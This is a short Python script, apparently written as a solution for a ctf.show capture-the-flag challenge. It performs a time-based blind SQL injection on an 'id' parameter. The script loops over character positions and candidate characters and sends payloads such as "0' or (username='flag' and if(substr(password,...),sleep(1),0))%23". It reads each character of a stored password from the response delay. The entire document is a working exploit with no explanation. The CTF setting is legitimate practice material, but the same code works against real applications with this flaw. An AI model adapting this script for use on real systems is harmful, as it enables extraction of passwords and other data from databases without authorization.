# author:yu22x
import requests
import time
import string

str = string.digits + string.ascii_lowercase + "{-}"
url = 'http://e804cdee-a3b9-4508-bba6-9c6e6b8ef10a.challenge.ctf.show/api/v5.php?id='
flag = ''

for i in range(1, 50):
    # print(i)
    for j in str:
        payload = "0' or ( username='flag' and if(substr(password,{},1)='{}',sleep(1),0))%23".format(i, j)
        stime = time.time()
        # print(url + payload)
        r = requests.get(url + payload)
        etime = time.time()
        if etime - stime >= 1:
            flag += j
            print(flag)
            break
